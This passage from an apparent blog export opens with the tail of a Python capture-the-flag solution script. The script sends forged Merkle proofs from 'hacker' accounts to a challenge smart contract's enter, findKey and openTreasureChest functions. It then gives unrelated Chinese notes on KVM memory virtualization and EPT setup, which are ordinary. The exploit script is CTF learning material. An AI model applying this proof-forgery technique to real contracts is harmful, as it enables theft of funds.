class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter2</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">1</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">1</span>]</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x799d6ded98975eb22e289ea90ff6f3f327537299ab8325e695c61d31ee711c56&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\"># 根据顺序调整height </span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000002&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter3</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">2</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">2</span>]</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0xcc2f18436e39156aa78964ff9e33acb4778bfd7a3182a20a5e86e2578a2dd334&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter4</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">3</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">3</span>]</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x68ee889a32ce609fc0acbf31dd1cc40b522d2c1fcabc0b0d5d2cd66cde478338&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter5</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">4</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">4</span>]</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x2510d5ab38c5a927545402b81c45a0b780bb7de6d395a41c0f2828381298f2db&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pickupTreasureChest</span>():</span><br><span class=\"line\">    </span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 先做这个 根据递增的要求构造出5个地址 记录merge的顺序</span></span><br><span class=\"line\">    c1 = <span class=\"string\">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class=\"line\">    c2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    n = <span class=\"number\">19</span></span><br><span class=\"line\">    proof = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = c1</span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">7</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">8</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">9</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">10</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">11</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">12</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">13</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">14</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">15</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">16</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">17</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">18</span>] = c2</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">        </span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,pickupTreasureChest_sig(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">findKey</span>():</span><br><span class=\"line\">    </span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    c1 = <span class=\"string\">&#x27;0xbccd02410d2e51fe9783b9597d341834148ebbfd545ad02023fcf29e54ffc35e&#x27;</span></span><br><span class=\"line\">    c2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">19</span></span><br><span class=\"line\">    proof = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">7</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">8</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">9</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">10</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">11</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">12</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">13</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">14</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">15</span>] = c1</span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">16</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">17</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">18</span>] = c2</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">        </span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,findKey_sig(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">openTreasureChest</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,openTreasureChest_sig(),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\">openTreasureChest()</span><br></pre></td></tr></table></figure>","categories":["ctf"]},{"title":"kvm 内存","url":"/2024/09/17/virtualization/kvm%20%E5%86%85%E5%AD%98/","content":"<h1 id=\"kvm-内存\"><a href=\"#kvm-内存\" class=\"headerlink\" title=\"kvm 内存\"></a>kvm 内存</h1><p><a href=\"https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3c-part-3-manual.pdf\">intel.com&#x2F;content&#x2F;dam&#x2F;www&#x2F;public&#x2F;us&#x2F;en&#x2F;documents&#x2F;manuals&#x2F;64-ia-32-architectures-software-developer-vol-3c-part-3-manual.pdf</a></p>\n<ul>\n<li>guest自己配置的页表完成GVA-&gt;GPA翻译 kvm不管这个数据结构</li>\n<li>kvm的memslot完成GPA-&gt;HVA翻译 kvm维护这个数据结构，参数由用户态(qemu)提供</li>\n<li>kvm的EPT(spt)完成GPA-&gt;HPA翻译，完全由kvm分配维护。需要结合memslot与自己进程的页表构造EPT</li>\n<li>内核模块完成HVA-&gt;HPA翻译，涉及到VMA、页表等数据结构，在kvm需要的时候提供查询</li>\n</ul>\n<h2 id=\"VMCS\"><a href=\"#VMCS\" class=\"headerlink\" title=\"VMCS\"></a>VMCS</h2><p>一个vcpu对应一个VMCS，包括一套寄存器和一个虚拟MMU等。</p>\n<p><code>kvm_vm_ioctl_create_vcpu</code>会设置对应的虚拟mmu信息</p>\n<p>通过硬件提供的扩展指令设置当前的VMCS并且读写VMCS的域</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">vmcs_load</span><span class=\"params\">(<span class=\"keyword\">struct</span> vmcs *vmcs)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tu64 phys_addr = __pa(vmcs);</span><br><span class=\"line\">\tu8 error;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span> <span class=\"params\">(__ex(ASM_VMX_VMPTRLD_RAX) <span class=\"string\">&quot;; setna %0&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\t: <span class=\"string\">&quot;=qm&quot;</span>(error) : <span class=\"string\">&quot;a&quot;</span>(&amp;phys_addr), <span class=\"string\">&quot;m&quot;</span>(phys_addr)</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t: <span class=\"string\">&quot;cc&quot;</span>, <span class=\"string\">&quot;memory&quot;</span>)</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (error)</span><br><span class=\"line\">\t\tprintk(KERN_ERR <span class=\"string\">&quot;kvm: vmptrld %p/%llx failed\\n&quot;</span>,</span><br><span class=\"line\">\t\t       vmcs, phys_addr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> __always_inline <span class=\"type\">void</span> __vmcs_writel(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> field, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> value)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tu8 error;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span> <span class=\"params\">(__ex(ASM_VMX_VMWRITE_RAX_RDX) <span class=\"string\">&quot;; setna %0&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t       : <span class=\"string\">&quot;=q&quot;</span>(error) : <span class=\"string\">&quot;a&quot;</span>(value), <span class=\"string\">&quot;d&quot;</span>(field) : <span class=\"string\">&quot;cc&quot;</span>)</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (unlikely(error))</span><br><span class=\"line\">\t\tvmwrite_error(field, value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span> <span class=\"title\">vmcs_field</span> &#123;</span></span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tHOST_RSP                        = <span class=\"number\">0x00006c14</span>,</span><br><span class=\"line\">\tHOST_RIP                        = <span class=\"number\">0x00006c16</span>,</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>field赋值给rdx，value赋值给rax，随后此条汇编指令执行<code>vmcs[%rdx]=%rax</code></p>\n<h2 id=\"启动与配置\"><a href=\"#启动与配置\" class=\"headerlink\" title=\"启动与配置\"></a>启动与配置</h2><h3 id=\"module-init\"><a href=\"#module-init\" class=\"headerlink\" title=\"module init\"></a>module init</h3><p>加载module时会根据arch进行相关的硬件初始化，并直接在硬件允许的情况下打开EPT的设置</p>\n<p>(module_init)<code>vmx_init</code>-&gt;<code>kvm_init</code>-&gt;<code>kvm_arch_hardware_setup</code>-&gt;<code>hardware_setup</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> __read_mostly enable_ept = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"type\">static</span> __init <span class=\"type\">int</span> <span class=\"title function_\">hardware_setup</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!cpu_has_vmx_ept() ||</span><br><span class=\"line\">\t    !cpu_has_vmx_ept_4levels() ||</span><br><span class=\"line\">\t    !cpu_has_vmx_ept_mt_wb() ||</span><br><span class=\"line\">\t    !cpu_has_vmx_invept_global())</span><br><span class=\"line\">\t\tenable_ept = <span class=\"number\">0</span>;</span><br><span class=\"line\">    \t<span class=\"keyword\">if</span> (enable_ept)</span><br><span class=\"line\">\t\t\tvmx_enable_tdp();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\tkvm_disable_tdp();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>vmx_enable_tdp</code>-&gt;<code>kvm_enable_tdp</code></p>\n<h3 id=\"create\"><a href=\"#create\" class=\"headerlink\" title=\"create\"></a>create</h3><h4 id=\"cr3\"><a href=\"#cr3\" class=\"headerlink\" title=\"cr3\"></a>cr3</h4><p>用户态可以设置sreg 指定cr3的值</p>\n<p>[q]这里用户态(例如qemu)配置cr3的值是否可有可无？操作系统启动不都是会自己配置页表和cr3吗</p>\n<p>操作系统(如chcore)会在打开mmu之前先进行页表配置，如何兼容这样的操作系统？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_arch_vcpu_ioctl_set_sregs</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t  <span class=\"keyword\">struct</span> kvm_sregs *sregs)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">\tvcpu-&gt;arch.cr3 = sregs-&gt;cr3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以kvm-hello-world为例</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">vm-&gt;mem = mmap(<span class=\"literal\">NULL</span>, mem_size, PROT_READ | PROT_WRITE,</span><br><span class=\"line\">\t\t   MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">memreg.guest_phys_addr = <span class=\"number\">0</span>;</span><br><span class=\"line\">memreg.memory_size = <span class=\"number\">0x200000</span>;</span><br><span class=\"line\">memreg.userspace_addr = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)vm-&gt;mem;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint64_t</span> pml4_addr = <span class=\"number\">0x2000</span>;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *pml4 = (<span class=\"type\">void</span> *)(vm-&gt;mem + pml4_addr);</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> pdpt_addr = <span class=\"number\">0x3000</span>;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *pdpt = (<span class=\"type\">void</span> *)(vm-&gt;mem + pdpt_addr);</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> pd_addr = <span class=\"number\">0x4000</span>;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *pd = (<span class=\"type\">void</span> *)(vm-&gt;mem + pd_addr);</span><br><span class=\"line\">pml4[<span class=\"number\">0</span>] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pdpt_addr;</span><br><span class=\"line\">pdpt[<span class=\"number\">0</span>] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pd_addr;</span><br><span class=\"line\">pd[<span class=\"number\">0</span>] = PDE64_PRESENT | PDE64_RW | PDE64_USER | PDE64_PS;</span><br><span class=\"line\"></span><br><span class=\"line\">sregs-&gt;cr3 = pml4_addr;</span><br></pre></td></tr></table></figure>\n\n<p>这是存储的是GPA，但是修改的是HVA。当进行地址翻译时，第一阶段页表存储的GPA本身就会被EPT翻译到HPA（或者GPA-&gt;HVA，再通过EPT Violation建立GPA-&gt;HPA）</p>\n<p>这里每个index都是0，且最后一级PTE没有地址，所以做的是0x0-&gt;0x0的地址映射，GPA&#x3D;GVA</p>\n<h4 id=\"mmu\"><a href=\"#mmu\" class=\"headerlink\" title=\"mmu\"></a>mmu</h4><p>用户态ioctl创建vcpu时，进行虚拟mmu初始化</p>\n<p><code>kvm_vm_ioctl</code>-&gt;<code>kvm_vm_ioctl_create_vcpu</code>-&gt;<code>kvm_arch_vcpu_setup</code>-&gt;<code>kvm_mmu_setup</code>-&gt;<code>init_kvm_mmu</code>-&gt;<code>init_kvm_tdp_mmu</code></p>\n<p>这里的配置是看后续函数调用和函数内部分支的依据</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">init_kvm_mmu</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (tdp_enabled)</span><br><span class=\"line\">\t\tinit_kvm_tdp_mmu(vcpu);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">init_kvm_tdp_mmu</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu</span> *<span class=\"title\">context</span> =</span> &amp;vcpu-&gt;arch.mmu;</span><br><span class=\"line\"></span><br><span class=\"line\">\tcontext-&gt;base_role.word = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tcontext-&gt;base_role.smm = is_smm(vcpu);</span><br><span class=\"line\">\tcontext-&gt;base_role.ad_disabled = (shadow_accessed_mask == <span class=\"number\">0</span>);</span><br><span class=\"line\">\tcontext-&gt;page_fault = tdp_page_fault;</span><br><span class=\"line\">\tcontext-&gt;sync_page = nonpaging_sync_page;</span><br><span class=\"line\">\tcontext-&gt;invlpg = nonpaging_invlpg;</span><br><span class=\"line\">\tcontext-&gt;update_pte = nonpaging_update_pte;</span><br><span class=\"line\">\tcontext-&gt;shadow_root_level = kvm_x86_ops-&gt;get_tdp_level(vcpu);</span><br><span class=\"line\">\tcontext-&gt;root_hpa = INVALID_PAGE;</span><br><span class=\"line\">\tcontext-&gt;direct_map = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\tcontext-&gt;set_cr3 = kvm_x86_ops-&gt;set_tdp_cr3;</span><br><span class=\"line\">\tcontext-&gt;get_cr3 = get_cr3;</span><br><span class=\"line\">\tcontext-&gt;get_pdptr = kvm_pdptr_read;</span><br><span class=\"line\">\tcontext-&gt;inject_page_fault = kvm_inject_page_fault;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!is_paging(vcpu)) &#123;</span><br><span class=\"line\">\t\tcontext-&gt;nx = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\tcontext-&gt;gva_to_gpa = nonpaging_gva_to_gpa;</span><br><span class=\"line\">\t\tcontext-&gt;root_level = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (is_long_mode(vcpu)) &#123;</span><br><span class=\"line\">\t\tcontext-&gt;nx = is_nx(vcpu);</span><br><span class=\"line\">\t\tcontext-&gt;root_level = is_la57_mode(vcpu) ?</span><br><span class=\"line\">\t\t\t\tPT64_ROOT_5LEVEL : PT64_ROOT_4LEVEL;</span><br><span class=\"line\">\t\treset_rsvds_bits_mask(vcpu, context);</span><br><span class=\"line\">\t\tcontext-&gt;gva_to_gpa = paging64_gva_to_gpa;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (is_pae(vcpu)) &#123;</span><br><span class=\"line\">\t\tcontext-&gt;nx = is_nx(vcpu);</span><br><span class=\"line\">\t\tcontext-&gt;root_level = PT32E_ROOT_LEVEL;</span><br><span class=\"line\">\t\treset_rsvds_bits_mask(vcpu, context);</span><br><span class=\"line\">\t\tcontext-&gt;gva_to_gpa = paging64_gva_to_gpa;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tcontext-&gt;nx = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\tcontext-&gt;root_level = PT32_ROOT_LEVEL;</span><br><span class=\"line\">\t\treset_rsvds_bits_mask(vcpu, context);</span><br><span class=\"line\">\t\tcontext-&gt;gva_to_gpa = paging32_gva_to_gpa;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tupdate_permission_bitmask(vcpu, context, <span class=\"literal\">false</span>);</span><br><span class=\"line\">\tupdate_pkru_bitmask(vcpu, context, <span class=\"literal\">false</span>);</span><br><span class=\"line\">\tupdate_last_nonleaf_level(vcpu, context);</span><br><span class=\"line\">\treset_tdp_shadow_zero_bits_mask(vcpu, context);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"run\"><a href=\"#run\" class=\"headerlink\" title=\"run\"></a>run</h3><p>每次run之前都会reload mmu</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_enter_guest</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    r = kvm_mmu_reload(vcpu);</span><br><span class=\"line\">    kvm_x86_ops-&gt;run(vcpu);</span><br><span class=\"line\">    r = kvm_x86_ops-&gt;handle_exit(vcpu);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>kvm_mmu_reload</code>-&gt;<code>kvm_mmu_load</code>-&gt;<code>mmu_alloc_roots</code>-&gt;<code>mmu_alloc_direct_roots</code></p>\n<h4 id=\"EPT\"><a href=\"#EPT\" class=\"headerlink\" title=\"EPT\"></a>EPT</h4><p>spt是shadow page table 虽然命名是影子页表，但实际上是EPT复用了这个数据结构。</p>\n<p><a href=\"https://blog.csdn.net/huang987246510/article/details/105645656/\">内存虚拟化软件基础——KVM SPT_spt和ept_享乐主的博客-CSDN博客</a></p>\n<p><img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230703194155548.png\" alt=\"image-20230703194155548\"></p>\n<p>这里page table page不是只记录一个基地址然后用指针连接，而是每个page都会对应一个<code>kvm_mmu_page</code>结构体，spt成员变量为真实的page table page</p>\n<p>这里root_hpa是EPT的基地址（HPA）</p>\n<h5 id=\"构造流程\"><a href=\"#构造流程\" class=\"headerlink\" title=\"构造流程\"></a>构造流程</h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_mmu_load</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tr = mmu_alloc_roots(vcpu);</span><br><span class=\"line\">\tvcpu-&gt;arch.mmu.set_cr3(vcpu, vcpu-&gt;arch.mmu.root_hpa);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">mmu_alloc_direct_roots</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span 